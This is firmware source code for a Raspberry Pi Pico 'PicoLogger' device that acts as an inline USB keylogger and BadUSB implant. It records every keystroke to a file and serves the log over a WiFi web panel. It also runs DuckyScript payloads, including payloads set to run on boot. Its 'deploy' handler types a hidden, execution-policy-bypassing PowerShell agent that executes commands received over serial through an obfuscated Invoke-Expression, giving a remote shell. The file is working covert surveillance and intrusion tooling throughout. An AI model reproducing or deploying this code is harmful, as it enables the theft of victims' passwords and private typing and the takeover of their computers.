#include <USBCrowKeyboard.h>
#include <LittleFS.h> 
#include "pio_usb.h"
#include "Adafruit_TinyUSB.h"
#include <WiFi.h>
#include <WebServer.h>

// ======================================= Define and Variables =============================================

#define HOST_PIN_DP   19
#define BUFFER_SIZE 64
#define INACTIVITY_TIMEOUT_MS 2000
#define MODIFIERKEY_LEFT_CTRL   (0x01)
#define MODIFIERKEY_LEFT_SHIFT  (0x02)
#define MODIFIERKEY_LEFT_ALT    (0x04)
#define MODIFIERKEY_LEFT_GUI    (0x08)
#define MODIFIERKEY_RIGHT_CTRL  (0x10)
#define MODIFIERKEY_RIGHT_SHIFT (0x20)
#define MODIFIERKEY_RIGHT_ALT   (0x40)
#define MODIFIERKEY_RIGHT_GUI   (0x80)
#define SHIFT   (0x80)
#define ALTGR   (0x40)

WebServer server(80);
extern const uint8_t _asciimap[] PROGMEM;
Adafruit_USBH_Host USBHost;
tusb_desc_device_t desc_device;
char keyBuffer[BUFFER_SIZE];
static uint8_t mod = 0;
uint8_t modifiersard=0;
uint8_t key;
uint8_t tmp_key;
int key_layout;
int key_modifier_layout;
uint8_t c = 0;
uint8_t bufferIndex = 0;
unsigned long lastKeyTime = 0;
uint8_t const desc_hid_report_reflection[] = { TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(1)) };
String ssid = "PicoLogger";  // Default SSID
String password = "12345678"; // Default Password

// ======================================= Buffer Functions =============================================
void openLogFile() {
    File f = LittleFS.open("/keys.txt", "a");
    if (!f) {
        Serial.println("Error opening log file");
    }
}

void writeBufferedKey(char key) {
    if (bufferIndex < BUFFER_SIZE - 1) {
        keyBuffer[bufferIndex++] = key;
        lastKeyTime = millis(); 
    } else {
        flushBuffer();
    }
}

void flushBuffer() {
  File f = LittleFS.open("/keys.txt", "a");
    if (bufferIndex > 0 && f) {
        f.write((const uint8_t*)keyBuffer, bufferIndex);
        f.flush();
        bufferIndex = 0;
    }
}

void closeLogFile() {
    flushBuffer();
    File f = LittleFS.open("/keys.txt", "a");
    if (f) {
        f.close();
    }
}

void checkInactivity() {
    if (bufferIndex > 0 && (millis() - lastKeyTime > INACTIVITY_TIMEOUT_MS)) {
        flushBuffer();
    }
}

// ======================================= Webserver Functions =============================================
void handleClearLogs() {
    File f = LittleFS.open("/keys.txt", "w");
    if (f) {
        f.write("");
        f.close();
        Serial.println("Log file cleared.");
    }
    server.sendHeader("Location", "/", true);
    server.send(303);
}

String readLogFile() {
    File file = LittleFS.open("/keys.txt", "r");
    if (!file) {
        return "Error: Unable to open log file.";
    }
    String content;
    while (file.available()) {
        content += (char)file.read();
    }
    file.close();
    return content;
}

bool loadWiFiState() {
    File file = LittleFS.open("/wifi_config.txt", "r");
    if (!file) {
        Serial.println("WiFi config not found, defaulting to ON.");
        return true;
    }
    String state = file.readString();
    file.close();
    state.trim();
    return (state == "ON");
}

void saveWiFiState(bool state) {
    File file = LittleFS.open("/wifi_config.txt", "w");
    if (file) {
        file.println(state ? "ON" : "OFF");
        file.close();
    } else {
        Serial.println("Failed to save WiFi state.");
    }
}

// ======================================= BadUSB Functions =============================================

void listPayloads() {
    String json = "[";
    Dir dir = LittleFS.openDir("/payloads");
    while (dir.next()) {
        if (json.length() > 1) json += ",";
        json += "\"" + dir.fileName() + "\"";
    }
    json += "]";
    server.send(200, "application/json", json);
}

void editPayload() {
    if (!server.hasArg("filename") || !server.hasArg("content")) {
        server.send(400, "text/plain", "Missing filename or content");
        return;
    }
    String filename = "/payloads/" + server.arg("filename");
    String content = server.arg("content");
    File file = LittleFS.open(filename, "w");
    if (!file) {
        server.send(500, "text/plain", "Failed to open file for writing");
        return;
    }
    file.print(content);
    file.close();
    server.send(200, "text/plain", "Payload updated successfully");
}

void savePayload() {
    if (!server.hasArg("filename") || !server.hasArg("content")) {
        server.send(400, "text/plain", "Missing parameters");
        return;
    }
    String filename = server.arg("filename");
    String content = server.arg("content");
    File file = LittleFS.open("/payloads/" + filename, "w");
    if (!file) {
        server.send(500, "text/plain", "File write failed");
        return;
    }
    file.print(content);
    file.close();
    server.send(200, "text/plain", "Saved successfully");
}

void deletePayload() {
    if (!server.hasArg("filename")) {
        server.send(400, "text/plain", "Missing filename");
        return;
    }
    String filename = "/payloads/" + server.arg("filename");
    if (LittleFS.remove(filename)) {
        server.send(200, "text/plain", "Deleted successfully");
    } else {
        server.send(500, "text/plain", "Delete failed");
    }
}

void runPayload() {
    if (!server.hasArg("filename")) {
        server.send(400, "text/plain", "Missing filename");
        return;
    }
    String filename = server.arg("filename");
    executePayload(filename);
    server.send(200, "text/plain", "Payload executed");
}

void executePayload(const String &filename) {
    String filepath = "/payloads/" + filename;
    File file = LittleFS.open(filepath, "r");
    if (!file) {
        Serial.println("[ERROR] Failed to open payload: " + filename);
        return;
    }
    Serial.println("[INFO] Running DuckyScript payload: " + filename);   
    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();        
        if (line.startsWith("DELAY ")) {
            int time = line.substring(6).toInt();
            delay(time);
        }else if (line.startsWith("STRING ")) {
            Keyboard.print(line.substring(7));
        }else if (line.startsWith("STRINGLN ")) {
            Keyboard.println(line.substring(9));
        }else if (line == "ENTER") {
            Keyboard.press(KEY_RETURN);
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "TAB") {
            Keyboard.press(KEY_TAB);
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "SPACE") {
            Keyboard.press(' ');
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "BACKSPACE") {
            Keyboard.press(KEY_BACKSPACE);
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "ESC") {
            Keyboard.press(KEY_ESC);
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "CTRL-SHIFT ENTER") {
            Keyboard.press(KEY_LEFT_CTRL);
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press(KEY_RETURN);
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "GUI") {
            Keyboard.press(KEY_LEFT_GUI);
            delay(100);
            Keyboard.releaseAll();
        }else if (line.startsWith("GUI ")) {
            String key = line.substring(4);
            Keyboard.press(KEY_LEFT_GUI);
            if (key.length() == 1) {
                Keyboard.press(key[0]);
            }
            delay(100);
            Keyboard.releaseAll();
        }else if (line.startsWith("CTRL ")) {
            String key = line.substring(5);
            Keyboard.press(KEY_LEFT_CTRL);
            if (key.length() == 1) {
                Keyboard.press(key[0]);
            }
            delay(100);
            Keyboard.releaseAll();
        }else if (line.startsWith("SHIFT ")) {
            String key = line.substring(6);
            Keyboard.press(KEY_LEFT_SHIFT);
            if (key.length() == 1) {
                Keyboard.press(key[0]);
            }
            delay(100);
            Keyboard.releaseAll();
        }else if (line.startsWith("ALT ")) {
            String key = line.substring(4);
            Keyboard.press(KEY_LEFT_ALT);
            if (key.length() == 1) {
                Keyboard.press(key[0]);
            }
            delay(100);
            Keyboard.releaseAll();
        }
    }
    file.close();
    Serial.println("[INFO] Payload execution complete: " + filename);
}

void handlePsAgent() {
  bool isAdmin = server.arg("admin") == "1";
  bool isHidden = server.arg("hidden") == "1";
  delay(1000);
  server.send(200, "text/plain", "Agent Deployed");
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell -Ep Bypass");
  delay(100);
  if (isAdmin) {
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_SHIFT);
      Keyboard.press(KEY_RETURN);
      delay(100);
      Keyboard.releaseAll();
      delay(2500);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.print("y");
      delay(100);
      Keyboard.releaseAll();
  }
  else{
      Keyboard.press(KEY_RETURN);
      delay(100);
      Keyboard.releaseAll();
  }
  delay(4000);
  if (isHidden) {
      Keyboard.print("$a='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);';$t=Add-Type -M $a -name Win32ShowWindowAsync -ns Win32Functions -Pas;");
      Keyboard.print("$h=(Get-Process -PID $pid).MainWindowHandle;$Host.UI.RawUI.WindowTitle='xx';$x=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'});$t::ShowWindowAsync($x.MainWindowHandle,0);");
      delay(100);
  }
  Keyboard.print("function fp{(Get-WMIObject Win32_SerialPort | Where-Object PNPDeviceID -match \"VID_239A\").DeviceID}$d=fp;$p=New-Object System.IO.Ports.SerialPort $d,115200,None,8,one;$p.DtrEnable=$true;$p.RtsEnable=$true;$p.Open();");
  Keyboard.print("$s=Sleep -M 100;while($true){if($p.BytesToRead -gt 0){$s;$c = $p.ReadLine().Trim();$p.DiscardInBuffer() ;if($c){try{$o=ie`x $c 2>&1;$r=if($o){$o -join \"`n\"}else{\"[Command executed]\"}}catch{$r=\"$_\"}$p.WriteLine($r)}}$s}");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
}


// ============================== Payload On Boot Functions ===============================
void handleGetPayload() {
    if (!server.hasArg("filename")) {
        server.send(400, "text/plain", "Missing filename");
        return;
    }
    String filename = "/payloads/" + server.arg("filename");
    File file = LittleFS.open(filename, "r");
    if (!file) {
        server.send(404, "text/plain", "File not found");
        return;
    }
    String fileContent = file.readString();
    file.close();
    server.send(200, "text/plain", fileContent);
}

void EnablePayloadOnBoot(String filename) {
    File file = LittleFS.open("/boot_payloads.txt", "a");
    if (!file) {
        server.send(500, "text/plain", "Failed to open boot payloads file");
        return;
    }
    file.println(filename);
    file.close();
    server.send(200, "text/plain", "Payload enabled on boot");
}

void DisablePayloadOnBoot(String filename) {
    File file = LittleFS.open("/boot_payloads.txt", "r");
    if (!file) {
        server.send(500, "text/plain", "Failed to open boot payloads file");
        return;
    }
    String updatedList = "";
    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line != filename) {  
            updatedList += line + "\n";
        }
    }
    file.close();
    file = LittleFS.open("/boot_payloads.txt", "w");
    if (!file) {
        server.send(500, "text/plain", "Failed to update boot payloads file");
        return;
    }
    file.print(updatedList);
    file.close();
    server.send(200, "text/plain", "Payload disabled on boot");
}

void handleTogglePayloadOnBoot() {
    if (!server.hasArg("filename") || !server.hasArg("enable")) {
        server.send(400, "text/plain", "Missing arguments");
        return;
    }
    String filename = server.arg("filename");
    bool enable = server.arg("enable") == "1";
    if (enable) {
        EnablePayloadOnBoot(filename);
    } else {
        DisablePayloadOnBoot(filename);
    }
}

void checkBootPayloads() {
    File file = LittleFS.open("/boot_payloads.txt", "r");
    if (!file) {
        Serial.println("[INFO] No boot payloads found.");
        return;
    }
    while (file.available()) {
        String filename = file.readStringUntil('\n');
        filename.trim();
        
        Serial.println("[INFO] Executing boot payload: " + filename);
        executePayload(filename);
    }   
    file.close();
}

void handleListBootPayloads() {
    if (!LittleFS.exists("/boot_payloads.txt")) {
        server.send(200, "application/json", "[]");
        return;
    }
    File file = LittleFS.open("/boot_payloads.txt", "r");
    if (!file) {
        server.send(500, "application/json", "[]");
        return;
    }
    String json = "[";
    bool first = true;
    while (file.available()) {
        String payload = file.readStringUntil('\n');
        payload.trim();
        if (payload.length() > 0) {
            if (!first) json += ",";
            first = false;
            json += "\"" + payload + "\"";
        }
    }
    json += "]";
    file.close();
    server.send(200, "application/json", json);
}

void handleSaveSettings() {
    if (server.hasArg("ssid") && server.hasArg("password") && server.hasArg("wifiState")) {
        String ssid = server.arg("ssid");
        String password = server.arg("password");
        bool wifiState = server.arg("wifiState") == "ON";
        changeSSID(ssid);
        changePassword(password);
        saveWiFiState(wifiState);
        server.send(200, "text/plain", "Settings saved");
    } else {
        server.send(400, "text/plain", "Missing settings");
    }
}

void handleLoadSettings() {
    String settingsJson = "{\"ssid\":\"" + ssid + "\",\"password\":\"" + password + "\",\"wifiState\":\"" + (loadWiFiState() ? "ON" : "OFF") + "\"}";
    server.send(200, "application/json", settingsJson);
}

void handleFormatLittleFS() {
    if (LittleFS.begin()) {
        LittleFS.format();
        server.send(200, "text/plain", "LittleFS formatted successfully");
    } else {
        server.send(500, "text/plain", "Failed to format LittleFS");
    }
}

// ======================================= Serial Functions =============================================

void readLog() {
    File i = LittleFS.open("keys.txt", "r");
    delay(200);
    Serial.println("-------- LOGS ----------");
    if (i) {
      while (i.available()) {
        Serial.write(i.read());
      }
      i.close();
    }
    Serial.println("\n------------------------");
    Serial.println("\n");
}

void clearLog() {
    File i = LittleFS.open("keys.txt", "w");
    delay(2000);
    if (i) {
      i.write("");
      Serial.println("Log File Deleted: DONE");
      i.close();
    }
}

void formatFS() {
    delay(2000);
    LittleFS.format();
    Serial.println("Formatted FS : DONE");
}

// ======================================= WiFi Config Functions =============================================

void saveWiFiSettings() {
    File file = LittleFS.open("/settings.txt", "w");
    if (file) {
        file.println(ssid);
        file.println(password);
        file.close();
    } else {
        Serial.println("Failed to save WiFi settings.");
    }
}

void loadWiFiSettings() {
    File file = LittleFS.open("/settings.txt", "r");
    if (!file) {
        Serial.println("No saved WiFi settings found. Using defaults.");
        // ssid = "PicoLogger";
        // password = "12345678";
        saveWiFiSettings();
        return;
    }
    ssid = file.readStringUntil('\n');
    password = file.readStringUntil('\n');
    ssid.trim();
    password.trim();  
    file.close();
    Serial.println("Loaded saved WiFi settings.");
}

void changeSSID(String newSSID) {
    if (newSSID.length() > 0) {
        ssid = newSSID;
        Serial.println("SSID changed to: " + ssid);
        saveWiFiSettings();
    } else {
        Serial.println("Error: SSID cannot be empty.");
    }
}

void changePassword(String newPassword) {
    if (newPassword.length() >= 8) {
        password = newPassword;
        Serial.println("Password changed.");
        saveWiFiSettings();
    } else {
        Serial.println("Error: Password must be at least 8 characters.");
    }
}

void handleKeyPress() {
    if (server.hasArg("key")) {
        String keyCombo = server.arg("key");
        Serial.print("Key Pressed: ");
        Serial.println(keyCombo);
        bool guiPressed = false;
        bool altPressed = false;
        bool ctrlPressed = false;
        String key = "";
        std::vector<String> keys;
        int start = 0;
        int index = keyCombo.indexOf('+');
        while (index != -1) {
            keys.push_back(keyCombo.substring(start, index));
            start = index + 1;
            index = keyCombo.indexOf('+', start);
        }
        keys.push_back(keyCombo.substring(start));
        for (String k : keys) {
            k.trim();
            if (k.equalsIgnoreCase("CTRL")) ctrlPressed = true;
            else if (k.equalsIgnoreCase("ALT")) altPressed = true;
            else if (k.equalsIgnoreCase("GUI")) guiPressed = true;
            else key = k;
        }
        if (guiPressed && key.length() == 0) {
            Keyboard.press(KEY_LEFT_GUI);
            delay(100);
            Keyboard.releaseAll();
        } else {
            if (guiPressed) Keyboard.press(KEY_LEFT_GUI);
            if (altPressed) Keyboard.press(KEY_LEFT_ALT);
            if (ctrlPressed) Keyboard.press(KEY_LEFT_CTRL);
            if (key.length() == 1) {
                Keyboard.press(key[0]);
            } else if (key.equalsIgnoreCase("ENTER")) {
                Keyboard.press(KEY_RETURN);
            } else if (key.equalsIgnoreCase("TAB")) {
                Keyboard.press(KEY_TAB);
            } else if (key.equalsIgnoreCase("SPACE")) {
                Keyboard.press(' ');
            } else if (key.equalsIgnoreCase("BACKSPACE")) {
                Keyboard.press(KEY_BACKSPACE);
            } else if (key.equalsIgnoreCase("ESC")) {
                Keyboard.press(KEY_ESC);
            }
            delay(100);
            Keyboard.releaseAll();
        }
        server.send(200, "text/plain", "Key sent: " + keyCombo);
    } else {
        server.send(400, "text/plain", "Missing key parameter");
    }
}


// ======================================= Main Setup and Loop =============================================
void setup() {
    Serial.begin(115200);
    LittleFS.begin();
    Keyboard.begin();
    delay(1000);
    checkBootPayloads();   
    loadWiFiSettings();
    bool wifiEnabled = loadWiFiState();
    if (wifiEnabled) {
        WiFi.softAP(ssid.c_str(), password.c_str());
        // String apip = WiFi.softAPIP();
        Serial.print("WiFi AP Started. Connect to: \n\tWiFi Name: " + String(ssid) + "\n\tPassword: " + String(password) + "\n\tWeb Interface: http://");// http://" + String(apip));
        // Serial.print(WiFi.softAPIP() + "\n");
        Serial.print(WiFi.softAPIP());
        Serial.print("\n");
    } else {
        Serial.println("WiFi is disabled. Use 'wifion' to enable.");
    }
    LittleFS.mkdir("/payloads");
    server.on("/payloads", HTTP_GET, handlePayloadsPage);
    server.on("/list_payloads", HTTP_GET, listPayloads);
    server.on("/save_payload", HTTP_POST, savePayload);
    server.on("/delete_payload", HTTP_POST, deletePayload);
    server.on("/get-payload", HTTP_GET, handleGetPayload);
    server.on("/run_payload", HTTP_POST, runPayload);
    server.on("/", HTTP_GET, handleRoot);  
    server.on("/clear", HTTP_POST, handleClearLogs);
    server.on("/toggle_payload_boot", HTTP_POST, handleTogglePayloadOnBoot);
    server.on("/list_boot_payloads", HTTP_GET, handleListBootPayloads);
    server.on("/settings", HTTP_GET, handleSettingsPage);
    server.on("/save_settings", HTTP_POST, handleSaveSettings);
    server.on("/load_settings", HTTP_GET, handleLoadSettings);
    server.on("/format_littlefs", HTTP_POST, handleFormatLittleFS);
    server.on("/keyboard", HTTP_GET, handleKeyboardPage);
    server.on("/keypress", HTTP_POST, handleKeyPress);
    server.on("/shell", HTTP_GET, handleShell);
    server.on("/execute", HTTP_POST, handleExecuteCommand);
    server.on("/deploy", HTTP_POST, handlePsAgent);
    server.begin();
    Serial.println("HTTP Server Started.");
}

void loop() { 
    if (Serial.available()) {
        String command = Serial.readStringUntil('\n');
        command.trim();       
        if (command.startsWith("ssid ")) {
            changeSSID(command.substring(5));
        } else if (command.startsWith("password ")) {
            changePassword(command.substring(9));
        } else if (command == "read") {
            readLog();
        } else if (command == "clear") {
            clearLog();
        } else if (command == "format") {
            formatFS();
        } else if (command == "wifion") {
            WiFi.softAP(ssid.c_str(), password.c_str());
            Serial.println("WiFi enabled.");
            saveWiFiState(true);
        } else if (command == "wifioff") {
            WiFi.softAPdisconnect(true);
            Serial.println("WiFi disabled.");
            saveWiFiState(false);
        }
    }   
    server.handleClient();
    checkInactivity();
}

void setup1() { 
    Serial.println("Core1 setup to run TinyUSB host with pio-usb");
    uint32_t cpu_hz = clock_get_hz(clk_sys);
    if ( cpu_hz != 120000000UL && cpu_hz != 240000000UL ) {
      Serial.printf("Error: CPU Clock = %u, PIO USB require CPU clock must be multiple of 120 Mhz\r\n", cpu_hz);
      Serial.printf("Change your CPU Clock to either 120 or 240 Mhz in Menu->CPU Speed \r\n", cpu_hz);
    }
    pio_usb_configuration_t pio_cfg = PIO_USB_DEFAULT_CONFIG;
    pio_cfg.pin_dp = HOST_PIN_DP;
    USBHost.configure_pio_usb(1, &pio_cfg);
    USBHost.begin(1);
}

void loop1() {
    USBHost.task();
}

// ======================================= Setup Host Keyboard =============================================
void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report, uint16_t desc_len) {
    if ( !tuh_hid_receive_report(dev_addr, idx) ) {
      Serial.printf("Error: cannot request to receive report\r\n");
    }  
}

void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* report, uint16_t len) {
    static bool reportPending = false;
    if (!reportPending) {
        uint8_t const itf_protocol = tuh_hid_interface_protocol(dev_addr, idx);
        if (itf_protocol == HID_ITF_PROTOCOL_KEYBOARD) {
            process_boot_kbd_report((hid_keyboard_report_t const*)report);
        }        
        reportPending = true;
        tuh_hid_receive_report(dev_addr, idx);
        reportPending = false;
    }
}

void SetModifiersArd(void) {
  modifiersard=0;
  if(mod == 2) modifiersard = SHIFT;
  if(mod == 64) modifiersard = ALTGR;
};

void ProcessKeys(void) {
  if (key == KEY_RETURN) {
    Keyboard.write('\n');
  }
  else if (key == 82) {
    Keyboard.press(KEY_UP_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 81) {
    Keyboard.press(KEY_DOWN_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 80) {
    Keyboard.press(KEY_LEFT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 79) {
    Keyboard.press(KEY_RIGHT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 41) {
    Keyboard.press(KEY_ESC); delay(100);Keyboard.releaseAll();
  }
  else if (key == 73) {
    Keyboard.press(KEY_INSERT); delay(100);Keyboard.releaseAll();
  }
  else if (key == 77) {
    Keyboard.press(KEY_END); delay(100);Keyboard.releaseAll();
  }
  else if (key == 57) {
    Keyboard.press(KEY_CAPS_LOCK); delay(100);Keyboard.releaseAll();
  }
  else if (key == 70) {
    Keyboard.press(KEY_PRINT_SCREEN); delay(100);Keyboard.releaseAll();
  }
  else if (key == 58) {
    Keyboard.press(KEY_F1); delay(100);Keyboard.releaseAll();
  }
  else if (key == 59) {
    Keyboard.press(KEY_F2); delay(100);Keyboard.releaseAll();
  }
  else if (key == 60) {
    Keyboard.press(KEY_F3); delay(100);Keyboard.releaseAll();
  }
  else if (key == 61) {
    Keyboard.press(KEY_F4); delay(100);Keyboard.releaseAll();
  }
  else if (key == 62) {
    Keyboard.press(KEY_F5); delay(100);Keyboard.releaseAll();
  }
  else if (key == 63) {
    Keyboard.press(KEY_F6); delay(100);Keyboard.releaseAll();
  }
  else if (key == 64) {
    Keyboard.press(KEY_F7); delay(100);Keyboard.releaseAll();
  }
  else if (key == 65) {
    Keyboard.press(KEY_F8); delay(100);Keyboard.releaseAll();
  }
  else if (key == 66) {
    Keyboard.press(KEY_F9); delay(100);Keyboard.releaseAll();
  }
  else if (key == 67) {
    Keyboard.press(KEY_F10); delay(100);Keyboard.releaseAll();
  }
  else if (key == 68) {
    Keyboard.press(KEY_F11); delay(100);Keyboard.releaseAll();
  }
  else if (key == 69) {
    Keyboard.press(KEY_F12); delay(100);Keyboard.releaseAll();
  }
  else if (key == 43) {
    Keyboard.press(KEY_TAB); delay(100);Keyboard.releaseAll();
  }
  else if (key == 42) {
    Keyboard.press(KEY_BACKSPACE); delay(100);Keyboard.releaseAll();
  }
}


// ======================================= Process Keystrokes =============================================

void process_boot_kbd_report(hid_keyboard_report_t const *report) {
    static hid_keyboard_report_t prev_report = { 0, 0, {0} };
    static bool prev_modifier_state = false;
    static bool modifier_changed = false;
    static uint8_t last_pressed_keys[6] = {0};
    if(report->modifier) {
      for(uint8_t i=0; i<6; i++) {
        key = report->keycode[i];
      }
      mod = report->modifier;
      if(key == 0 && mod == 8) {
        Keyboard.press(KEY_LEFT_GUI);
      }
    }
    
    bool current_modifier_state = (report->modifier != 0);
    if (current_modifier_state != prev_modifier_state) {
        if (current_modifier_state) {
            mod = report->modifier;
            modifier_changed = true;
        } else {
            delay(100);
            Keyboard.releaseAll();
            modifier_changed = true;
            mod = 0;
        }
        prev_modifier_state = current_modifier_state;
    }
    
    for (uint8_t i = 0; i < 6; i++) {
        uint8_t key = report->keycode[i];
        if (key) {
            bool already_pressed = false;
            for (uint8_t j = 0; j < 6; j++) {
                if (last_pressed_keys[j] == key) {
                    already_pressed = true;
                    break;
                }
            }           
            if (!already_pressed) {
                SetModifiersArd();
                key_modifier_layout = key | modifiersard;
                
                for (int i = 0; i < 128; i++) {
                    uint8_t mappedValue = pgm_read_byte(_asciimap + i);
                    
                    if (mappedValue == key_modifier_layout) {
                        char loggedChar = (char)i;
                        bool shiftActive = (mod & MODIFIERKEY_LEFT_SHIFT) || (mod & MODIFIERKEY_RIGHT_SHIFT);
                
                        if (shiftActive && loggedChar >= 'a' && loggedChar <= 'z') {
                            loggedChar = loggedChar - 'a' + 'A';
                        }
                        if (shiftActive) {
                            switch (loggedChar) {
                                case '1': loggedChar = '!'; break;
                                case '2': loggedChar = '@'; break;
                                case '3': loggedChar = '#'; break;
                                case '4': loggedChar = '$'; break;
                                case '5': loggedChar = '%'; break;
                                case '6': loggedChar = '^'; break;
                                case '7': loggedChar = '&'; break;
                                case '8': loggedChar = '*'; break;
                                case '9': loggedChar = '('; break;
                                case '0': loggedChar = ')'; break;
                                case '-': loggedChar = '_'; break;
                                case '=': loggedChar = '+'; break;
                                case '[': loggedChar = '{'; break;
                                case ']': loggedChar = '}'; break;
                                case '\\': loggedChar = '|'; break;
                                case ';': loggedChar = ':'; break;
                                case '\'': loggedChar = '\"'; break;
                                case ',': loggedChar = '<'; break;
                                case '.': loggedChar = '>'; break;
                                case '/': loggedChar = '?'; break;
                            }
                        }
                        writeBufferedKey(loggedChar);
                    }
                } 
                Keyboard.rawpress(key, mod);
            }
        }
    }   
    for (uint8_t i = 0; i < 6; i++) {
        bool still_pressed = false;
        for (uint8_t j = 0; j < 6; j++) {
            if (report->keycode[j] == last_pressed_keys[i]) {
                still_pressed = true;
                break;
            }
        }       
        if (!still_pressed && last_pressed_keys[i]) {
            Keyboard.rawrelease(last_pressed_keys[i], mod);
        }
    }   
    memcpy(last_pressed_keys, report->keycode, 6);
}

// ======================================= HTML Pages ============================================= 

void handleRoot() {
    String html = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Keylogger</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                background-color: #1e1e1e;
                color: #ffffff;
            }
            .top-bar {
                background: #333;
                padding: 10px 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 10%;
            }
            .top-bar a {
                color: white;
                text-decoration: none;
                padding: 10px 15px;
                margin: 0 5px;
                border-radius: 5px;
                background: #444;
                transition: 0.3s;
            }
            .top-bar a:hover {
                background: #666;
            }
            .container {
                width: 90%;
                max-width: 1000px;
                margin: 20px auto;
                background: #222;
                padding: 20px 20px 60px 20px;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
            }
            h2 {
                text-align: center;
                color: #ffcc00;
            }
            pre {
                background-color: #333;
                border: 1px solid #555;
                padding: 15px;
                overflow-x: auto;
                white-space: pre-wrap;
                word-wrap: break-word;
                max-height: 400px;
                overflow-y: auto;
            }
            button {
                display: block;
                width: 100%;
                padding: 10px;
                margin-top: 10px;
                background: #ffcc00;
                color: black;
                border: none;
                font-size: 16px;
                font-weight: bold;
                border-radius: 5px;
                cursor: pointer;
                transition: 0.3s;
            }
            button:hover {
                background: #ffaa00;
            }
            .ascii-container {
                color: #ffcc00;
                display: auto;
                justify-content: center;
                align-items: center;
                width: 100%;
                overflow: auto;
                font-size: 14px;
                font-weight: bold;
            }
            .ascii-art {
                background: none;
                border: none;
                padding: 0;
                font-size: 14px;
                font-weight: bold;
                color: #ffcc00;
                text-align: center;
            }
            .footer {
                text-align: center;
                color: #ffcc00;
                font-size: 14px;
                background: #333;
                position: fixed;
                width: 100%;
                bottom: 0;
            }
            
            .footer a {
                color: #ffcc00;
                text-decoration: none;
                transition: 0.3s;
            }
        </style>
    </head>
    <body>
        <div class="top-bar">
            <a href="/">Keylogger</a>
            <a href="/payloads">Payload Manager</a>
            <a href="/keyboard">Virtual Keyboard</a>
            <a href="/shell">Remote Shell</a>
            <a href="/settings">Settings</a>
        </div>
<div class="ascii-container" align="center">
    <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
    </pre>
</div>
        <div class="container">
            <h2>USB Keylogger Logs</h2>
            <pre>)rawliteral";    
    html += readLogFile();   
    html += R"rawliteral(</pre>
            <form action='/clear' method='POST'>
                <button type='submit'>Clear Logs</button>
            </form>
        </div>
        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", html);
}


void handlePayloadsPage() {
    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Payload Manager</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                background-color: #1e1e1e;
                color: #ffffff;
            }
            .top-bar {
                background: #333;
                padding: 10px 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 10%;
            }
            .top-bar a {
                color: white;
                text-decoration: none;
                padding: 10px 15px;
                margin: 0 5px;
                border-radius: 5px;
                background: #444;
                transition: 0.3s;
            }
            .top-bar a:hover {
                background: #666;
            }
            .container {
                width: 90%;
                max-width: 1000px;
                margin: 20px auto;
                background: #222;
                padding: 20px 20px 60px 20px;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
            }
            h2, h3 {
                text-align: center;
                color: #ffcc00;
            }
            input, textarea {
                box-sizing: border-box;
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border-radius: 5px;
                border: none;
                background: #333;
                color: white;
            }
            button {
                display: block;
                width: 100%;
                padding: 10px;
                margin-top: 10px;
                background: #ffcc00;
                color: black;
                border: none;
                font-size: 16px;
                font-weight: bold;
                border-radius: 5px;
                cursor: pointer;
                transition: 0.3s;
            }
            button:hover {
                background: #ffaa00;
            }
            table {
                width: 100%;
                margin-top: 20px;
                border-collapse: collapse;
                text-align: left;
            }
            table, th, td {
                border: 1px solid #444;
            }
            th, td {
                padding: 10px;
                background: #333;
            }
            .action-buttons {
                display: flex;
                gap: 10px;
            }
            .action-buttons button {
                flex: 1;
                padding: 8px 12px;
                font-size: 14px;
                border: none;
                cursor: pointer;
                background: #ffcc00;
                color: black;
                border-radius: 5px;
                transition: 0.3s;
            }
            .action-buttons button:hover {
                background: #ffaa00;
            }
            .switch {
                position: relative;
                display: inline-block;
                width: 34px;
                height: 20px;
            }
            .switch input {
                opacity: 0;
                width: 0;
                height: 0;
            }
            .slider {
                position: absolute;
                cursor: pointer;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background-color: #ccc;
                border-radius: 20px;
                transition: 0.4s;
            }
            .slider:before {
                position: absolute;
